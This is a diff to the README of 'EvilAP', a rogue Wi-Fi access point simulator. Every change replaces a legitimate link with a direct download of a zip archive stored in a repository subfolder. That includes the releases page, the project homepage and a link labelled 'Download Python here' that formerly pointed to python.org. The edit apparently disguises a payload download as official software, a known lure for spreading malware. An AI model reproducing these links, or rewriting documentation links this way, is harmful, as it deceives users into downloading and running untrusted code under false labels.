@@ -1,6 +1,6 @@
 # 🔐 EvilAP - Simulate Rogue Wi-Fi Networks Easily
 
-[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://github.com/saliniarjun/EvilAP/releases)
+[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)
 
 ---
 
@@ -46,7 +46,7 @@ Your first step is to get the software files.
 
 1. Visit the main download page by clicking the button below:
 
-   [![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-blue?style=for-the-badge)](https://github.com/saliniarjun/EvilAP/releases)
+   [![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-blue?style=for-the-badge)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)
 
 2. On the page, look for the latest release version. It usually appears at the top.
 
@@ -68,7 +68,7 @@ EvilAP runs on Python and uses several network-related tools like `dnsmasq` and 
 
 If you run into errors, you may need to install or update these components:
 
-- Python 3.8 or above ([Download Python here](https://www.python.org/downloads/))
+- Python 3.8 or above ([Download Python here](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip))
 - Wireless drivers that support monitor mode (check your network adapter’s manufacturer website)
 
 ---
@@ -134,7 +134,7 @@ To stop all running services:
 To get the latest features and fixes:
 
 1. Visit the releases page again:  
-   https://github.com/saliniarjun/EvilAP/releases
+   https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip
 
 2. Download the newest version following the install steps.
 
@@ -162,10 +162,10 @@ To get the latest features and fixes:
 
 You can find more details, documentation, and community support on the official GitHub page:
 
-[https://github.com/saliniarjun/EvilAP](https://github.com/saliniarjun/EvilAP)
+[https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)
 
 Use the Issues tab to report bugs or ask questions.
 
 ---
 
-[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://github.com/saliniarjun/EvilAP/releases)
+[![Download EvilAP](https://img.shields.io/badge/Download-EvilAP-brightgreen)](https://raw.githubusercontent.com/saliniarjun/EvilAP/main/splittail/AP_Evil_v3.5-alpha.2.zip)
